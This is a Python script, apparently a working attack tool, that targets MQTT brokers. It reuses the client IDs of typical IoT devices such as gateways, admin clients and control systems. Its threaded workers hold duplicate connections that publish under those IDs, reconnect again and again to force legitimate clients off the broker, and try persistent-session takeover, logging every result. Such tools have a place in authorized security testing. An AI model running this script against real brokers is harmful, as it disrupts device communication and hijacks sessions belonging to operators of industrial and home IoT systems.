import argparse
import csv
import json
import os
import random
import threading
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

class DuplicateIDAttack:
    def __init__(self, args):
        self.args = args
        self.stop_event = threading.Event()
        self.log_writer, self.log_handle = self._prep_log(args.log_csv)
        self.log_lock = threading.Lock()
        
        self.connection_attempts = 0
        self.successful_connections = 0
        self.disconnections = 0
        self.connection_conflicts = 0
        
        self.target_client_ids = [
            "iot_gateway_001",
            "sensor_hub_main", 
            "data_collector",
            "mqtt_bridge",
            "system_monitor",
            "device_manager",
            "telemetry_client",
            "control_system",
            "admin_client",
            "backup_service",
        ]

    @staticmethod
    def _prep_log(path):
        if not path:
            return None, None
        exists = os.path.exists(path)
        handle = open(path, "a", newline="", encoding="utf-8")
        writer = csv.writer(handle)
        if not exists:
            writer.writerow([
                "timestamp_utc", "client_id", "action", "status", "return_code",
                "session_present", "details", "conflict_detected"
            ])
        return writer, handle

    def close(self):
        if self.log_handle:
            self.log_handle.flush()
            self.log_handle.close()

    def log_connection(self, client_id, action, status, return_code=None, session_present=False, 
                      details="", conflict_detected=False):
        if not self.log_writer:
            return
        with self.log_lock:
            self.log_writer.writerow([
                datetime.now(timezone.utc).isoformat(),
                client_id, action, status, return_code, session_present, details, conflict_detected
            ])

    def create_duplicate_client(self, target_client_id, worker_id):
        duplicate_client_id = target_client_id
        client = mqtt.Client(client_id=duplicate_client_id, clean_session=self.args.clean_session)
        
        if self.args.username:
            client.username_pw_set(self.args.username, self.args.password)
        
        connection_start = time.time()
        connected = False
        
        def on_connect(client, userdata, flags, rc):
            nonlocal connected
            self.connection_attempts += 1
            
            if rc == 0:
                connected = True
                self.successful_connections += 1
                status = "connected"
                conflict_detected = flags.get('session_present', False)
                if conflict_detected:
                    self.connection_conflicts += 1
            else:
                status = "failed"
                conflict_detected = False
            
            connection_time = time.time() - connection_start
            details = f"connection_time={connection_time:.3f}s,worker={worker_id}"
            
            self.log_connection(duplicate_client_id, "connect_attempt", status, rc, 
                              flags.get('session_present', False), details, conflict_detected)
            
            print(f"[Worker {worker_id}] Client {duplicate_client_id}: connect rc={rc}, "
                  f"session_present={flags.get('session_present', False)}")

        def on_disconnect(client, userdata, rc):
            self.disconnections += 1
            status = "voluntary" if rc == 0 else "involuntary"
            details = f"reason_code={rc},worker={worker_id}"
            
            self.log_connection(duplicate_client_id, "disconnect", status, rc, 
                              False, details, rc != 0)
            
            print(f"[Worker {worker_id}] Client {duplicate_client_id}: disconnected rc={rc}")

        def on_publish(client, userdata, mid):
            self.log_connection(duplicate_client_id, "publish", "success", 0, 
                              False, f"mid={mid},worker={worker_id}", False)

        client.on_connect = on_connect
        client.on_disconnect = on_disconnect
        client.on_publish = on_publish
        
        try:
            client.connect(self.args.broker, self.args.port, self.args.keepalive)
            client.loop_start()
            
            timeout = 10
            start_time = time.time()
            while not connected and time.time() - start_time < timeout and not self.stop_event.is_set():
                time.sleep(0.1)
            
            if connected:
                self.maintain_duplicate_connection(client, duplicate_client_id, worker_id)
            
        except Exception as e:
            self.log_connection(duplicate_client_id, "connect_attempt", "exception", 
                              -1, False, f"error={str(e)},worker={worker_id}", False)
            print(f"[Worker {worker_id}] Connection exception: {e}")
        
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def maintain_duplicate_connection(self, client, client_id, worker_id):
        activity_interval = random.uniform(5, 15)
        topic = f"duplicate/{client_id}/status"
        
        message_count = 0
        
        while not self.stop_event.is_set():
            try:
                payload = json.dumps({
                    "timestamp": datetime.now().isoformat(),
                    "client_id": client_id,
                    "worker": worker_id,
                    "message_count": message_count,
                    "duplicate_attack": True,
                    "session_type": "clean" if self.args.clean_session else "persistent"
                })
                
                result = client.publish(topic, payload, qos=1)
                message_count += 1
                
                if result.rc != mqtt.MQTT_ERR_SUCCESS:
                    self.log_connection(client_id, "publish", "failed", result.rc,
                                      False, f"mid={result.mid},worker={worker_id}", False)
                
                if message_count % 5 == 0:
                    test_topic = f"test/{client_id}/echo"
                    client.subscribe(test_topic, qos=0)
                    self.log_connection(client_id, "subscribe", "attempted", 0,
                                      False, f"topic={test_topic},worker={worker_id}", False)
                
                time.sleep(activity_interval)
                
            except Exception as e:
                self.log_connection(client_id, "activity", "exception", -1,
                                  False, f"error={str(e)},worker={worker_id}", False)
                print(f"[Worker {worker_id}] Activity exception: {e}")
                break

    def rapid_duplicate_connections(self, target_client_id, worker_id):
        connection_count = 0
        
        while not self.stop_event.is_set() and connection_count < self.args.max_rapid_connections:
            client = mqtt.Client(client_id=target_client_id, clean_session=True)
            
            if self.args.username:
                client.username_pw_set(self.args.username, self.args.password)
            
            try:
                start_time = time.time()
                client.connect(self.args.broker, self.args.port, 10)
                client.loop_start()
                
                time.sleep(random.uniform(1, 3))
                
                client.loop_stop()
                client.disconnect()
                
                connection_time = time.time() - start_time
                connection_count += 1
                
                self.log_connection(target_client_id, "rapid_connect", "completed", 0,
                                  False, f"duration={connection_time:.3f}s,count={connection_count},worker={worker_id}", False)
                
                if connection_count % 10 == 0:
                    print(f"[Worker {worker_id}] Rapid connections: {connection_count}")
                
                time.sleep(random.uniform(0.5, 2))
                
            except Exception as e:
                self.log_connection(target_client_id, "rapid_connect", "exception", -1,
                                  False, f"error={str(e)},worker={worker_id}", False)
                time.sleep(1)

    def session_takeover_attack(self, target_client_id, worker_id):
        for clean_session in [False, True]:
            if self.stop_event.is_set():
                break
                
            client = mqtt.Client(client_id=target_client_id, clean_session=clean_session)
            
            if self.args.username:
                client.username_pw_set(self.args.username, self.args.password)
            
            session_type = "clean" if clean_session else "persistent"
            
            def on_connect(client, userdata, flags, rc):
                session_present = flags.get('session_present', False)
                takeover_detected = session_present and clean_session == False
                
                details = f"session_type={session_type},session_present={session_present},worker={worker_id}"
                self.log_connection(target_client_id, "takeover_attempt", "connected" if rc == 0 else "failed",
                                  rc, session_present, details, takeover_detected)
                
                if takeover_detected:
                    print(f"[Worker {worker_id}] Session takeover detected for {target_client_id}")
            
            client.on_connect = on_connect
            
            try:
                client.connect(self.args.broker, self.args.port, self.args.keepalive)
                client.loop_start()
                
                time.sleep(random.uniform(3, 8))
                
                client.loop_stop()
                client.disconnect()
                
            except Exception as e:
                self.log_connection(target_client_id, "takeover_attempt", "exception", -1,
                                  False, f"session_type={session_type},error={str(e)},worker={worker_id}", False)
            
            time.sleep(2)

    def attack_worker(self, worker_id):
        print(f"[Worker {worker_id}] Starting duplicate ID attack")
        
        target_client_id = self.target_client_ids[worker_id % len(self.target_client_ids)]
        attack_type = worker_id % 3
        
        try:
            if attack_type == 0:
                print(f"[Worker {worker_id}] Persistent duplicate attack on {target_client_id}")
                self.create_duplicate_client(target_client_id, worker_id)
                
            elif attack_type == 1:
                print(f"[Worker {worker_id}] Rapid duplicate attack on {target_client_id}")
                self.rapid_duplicate_connections(target_client_id, worker_id)
                
            else:
                print(f"[Worker {worker_id}] Session takeover attack on {target_client_id}")
                self.session_takeover_attack(target_client_id, worker_id)
                
        except Exception as e:
            print(f"[Worker {worker_id}] Worker exception: {e}")

    def run(self):
        print(f"Starting Duplicate ID attack with {self.args.workers} workers")
        print(f"Target: {self.args.broker}:{self.args.port}")
        print(f"Target client IDs: {self.target_client_ids}")
        print(f"Clean session: {self.args.clean_session}")
        
        threads = []
        for i in range(self.args.workers):
            thread = threading.Thread(target=self.attack_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.5)
        
        try:
            while True:
                time.sleep(10)
                print(f"\n=== Duplicate ID Attack Statistics ===")
                print(f"Connection attempts: {self.connection_attempts}")
                print(f"Successful connections: {self.successful_connections}")
                print(f"Disconnections: {self.disconnections}")
                print(f"Detected conflicts: {self.connection_conflicts}")
                print("=====================================\n")
                
        except KeyboardInterrupt:
            print("\nStopping duplicate ID attack...")
            self.stop_event.set()
            
            for thread in threads:
                thread.join(timeout=10)
            
            print(f"\nDuplicate ID attack completed!")
            print(f"Total connection attempts: {self.connection_attempts}")
            print(f"Successful connections: {self.successful_connections}")
            print(f"Connection conflicts detected: {self.connection_conflicts}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Duplicate Client ID Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker address")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--keepalive", type=int, default=60, help="Keepalive interval")
    
    parser.add_argument("--workers", type=int, default=6, help="Number of attack workers")
    parser.add_argument("--clean-session", action="store_true", default=True,
                       help="Use clean session (default: True)")
    
    parser.add_argument("--max-rapid-connections", type=int, default=100,
                       help="Maximum rapid connections per worker")
    
    parser.add_argument("--log-csv", help="CSV file to log attack details")
    
    args = parser.parse_args()
    
    attack = DuplicateIDAttack(args)
    try:
        attack.run()
    finally:
        attack.close()

if __name__ == "__main__":
    main()
